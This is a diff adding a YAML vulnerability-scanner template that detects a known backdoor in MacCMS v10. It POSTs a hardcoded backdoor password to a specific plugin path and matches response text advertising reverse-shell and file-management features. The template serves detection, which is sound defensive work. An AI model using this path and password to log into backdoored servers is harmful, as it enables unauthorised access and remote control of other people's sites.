@@ -1,0 +1,22 @@
+detail:
+  author: FiveAourThe(https://github.com/FiveAourThe)
+  links:
+  - https://www.cnblogs.com/jinqi520/p/11596500.html
+  - https://www.t00ls.net/thread-53291-1-1.html
+expression: r0()
+manual: true
+name: poc-yaml-maccmsv10-backdoor
+rules:
+  r0:
+    expression: "response.status == 200 && response.body.bcontains(b\"\u626B\u63CF\
+      \u540E\u95E8\") && response.body.bcontains(b\"\u53CD\u5F39\u7AEF\u53E3\") &&\
+      \ response.body.bcontains(b\"\u6587\u4EF6\u7BA1\u7406\")"
+    request:
+      body: getpwd=WorldFilledWithLove
+      cache: true
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /extend/Qcloud/Sms/Sms.php
+transport: http
